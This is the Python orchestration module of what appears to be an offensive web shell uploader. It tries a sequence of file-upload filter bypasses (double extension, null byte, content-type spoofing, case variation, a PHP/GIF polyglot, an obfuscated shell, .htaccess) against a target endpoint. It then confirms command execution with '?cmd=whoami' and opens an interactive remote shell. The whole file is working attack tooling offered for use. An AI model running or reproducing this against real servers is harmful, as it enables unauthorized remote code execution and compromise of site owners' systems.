"""Main web shell uploader orchestration"""

from urllib.parse import urljoin
from .utils.request_handler import RequestHandler
from .utils.file_finder import FileFinder
from .shells import php_shells, aspx_shells, jsp_shells, polyglot
from .bypass import (
    direct_upload,
    double_extension,
    null_byte,
    content_type,
    case_variation,
    htaccess
)
from .interactive.shell_interface import ShellInterface

class WebShellUploader:
    """Main web shell uploader class"""
    
    def __init__(self, target_url, upload_endpoint):
        self.target_url = target_url.rstrip('/')
        self.upload_endpoint = upload_endpoint
        self.upload_url = urljoin(self.target_url, upload_endpoint)
        
        # Initialize utilities
        self.request_handler = RequestHandler()
        self.file_finder = FileFinder(self.request_handler, self.target_url)
    
    def run_full_exploitation(self):
        """
        Attempt all bypass techniques
        """
        print(f"[*] Web Shell Upload Exploitation")
        print(f"[*] Target: {self.upload_url}")
        print("=" * 60 + "\n")
        
        # Create shells
        php_shell = php_shells.create_simple_shell()
        php_shell_obf = php_shells.create_obfuscated_shell()
        
        shell_url = None
        
        # Try different bypass techniques
        techniques = [
            ('Direct Upload (PHP)', 
             lambda: direct_upload.attempt_direct_upload(
                 self.request_handler, self.file_finder, self.upload_url, php_shell, 'php'
             )),
            ('Double Extension', 
             lambda: double_extension.attempt_double_extension(
                 self.request_handler, self.file_finder, self.upload_url, php_shell
             )),
            ('Null Byte Injection', 
             lambda: null_byte.attempt_null_byte(
                 self.request_handler, self.file_finder, self.upload_url, php_shell
             )),
            ('Content-Type Bypass', 
             lambda: content_type.attempt_content_type_bypass(
                 self.request_handler, self.file_finder, self.upload_url, php_shell
             )),
            ('Case Variation', 
             lambda: case_variation.attempt_case_variation(
                 self.request_handler, self.file_finder, self.upload_url, php_shell
             )),
            ('Polyglot Image', 
             lambda: self._attempt_polyglot(php_shell)),
            ('Obfuscated Shell', 
             lambda: direct_upload.attempt_direct_upload(
                 self.request_handler, self.file_finder, self.upload_url, php_shell_obf, 'php'
             ))
        ]
        
        for name, technique in techniques:
            print(f"\n[*] Trying: {name}")
            result = technique()
            
            if result:
                shell_url = result
                break
        
        if not shell_url:
            print("\n[-] All bypass techniques failed")
            print("[*] Try uploading .htaccess first:")
            htaccess.attempt_htaccess_bypass(self.request_handler, self.upload_url)
            return
        
        # Test and interact with shell
        self._handle_successful_upload(shell_url)
    
    def _attempt_polyglot(self, php_shell):
        """Attempt polyglot file upload"""
        from .utils.name_generator import generate_shell_name
        
        polyglot_content = polyglot.create_php_gif_polyglot(php_shell)
        filename = f"{generate_shell_name()}.php.gif"
        
        files = {
            'file': (filename, polyglot_content, 'image/gif')
        }
        
        response = self.request_handler.post(self.upload_url, files=files)
        
        if response and response.status_code == 200:
            shell_url = self.file_finder.find_uploaded_file(filename, response)
            if shell_url:
                print(f"    [+] SUCCESS! Polyglot uploaded: {shell_url}")
                print(f"    [!] Access via: {shell_url}?cmd=whoami")
                return shell_url
        
        print("    [-] Polyglot upload failed")
        return None
    
    def _handle_successful_upload(self, shell_url):
        """Handle successful shell upload"""
        shell_interface = ShellInterface(self.request_handler, shell_url)
        
        # Test shell execution
        if shell_interface.test_execution():
            print("\n[+] Web shell is functional!")
            
            # Offer interactive shell
            choice = input("\n[?] Start interactive shell? (y/n): ")
            if choice.lower() == 'y':
                shell_interface.start_interactive()
        else:
            print("\n[!] Shell uploaded but may not be executing")
            print(f"[!] Try accessing manually: {shell_url}?cmd=whoami")